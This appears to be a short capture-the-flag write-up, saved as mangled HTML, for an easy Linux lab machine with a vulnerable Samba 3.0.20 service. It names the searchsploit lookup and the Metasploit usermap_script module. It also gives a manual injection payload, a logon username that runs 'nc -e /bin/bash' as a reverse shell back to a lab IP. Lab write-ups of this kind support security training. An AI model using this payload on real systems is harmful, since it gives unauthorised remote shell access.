I"·<p>DIGEST</p>

<p>An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. Itâ€™s vulnerable to the â€œSamba username map scriptâ€ vulnerability and exploited using both Manual and Metasploit module.</p>

<p>&lt;p&gt;
    &lt;table&gt;
        &lt;tbody&gt;
            &lt;tr&gt;
                &lt;td class=â€text-rightâ€&gt;OS:&lt;/td&gt;
                &lt;td&gt;Linux&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=â€text-rightâ€&gt;Difficulty:&lt;/td&gt;
                &lt;td&gt; &lt;span class=â€text-success boldâ€&gt;Easy&lt;/span&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=â€text-rightâ€&gt;Points:&lt;/td&gt;
                &lt;td&gt;&lt;span class=â€text-successâ€&gt;20&lt;/span&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=â€text-rightâ€&gt;Release:&lt;/td&gt;
                &lt;td&gt;14 Mar 2017&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td class=â€text-rightâ€&gt;IP:&lt;/td&gt;
                &lt;td&gt;10.10.10.3&lt;/td&gt;
            &lt;/tr&gt;
        &lt;/tbody&gt;
    &lt;/table&gt;
&lt;/p&gt; &lt;!â€“</p>

<p>&lt;/body&gt;
&lt;/html&gt; â€“&gt;</p>

<p>Tools Used:</p>

<p>Nmap, Searchsploit, Metsaploit</p>

<p>Initial Scan with Nmap:</p>

<p>Vulnerable Samba service on port 139:</p>

<p>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default â€œusername map scriptâ€ configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p>

<p>Searchsploit:</p>

<p>$ searchsploit Samba 3.0.20</p>

<p>MSF Module - Samba â€œusername map scriptâ€ Command Execution:</p>

<p>$ msf&gt; use exploit/multi/samba/usermap_script</p>

<p>Manual Exploitation:</p>

<p>logon â€œ./=nohup nc -e /bin/bash 10.10.14.18 4444â€</p>

<p>Rate Matrix:</p>

<p>Thanks for reading â¤ï¸! 
Feel free to leave a comment ğŸ’¬ below.</p>
:ET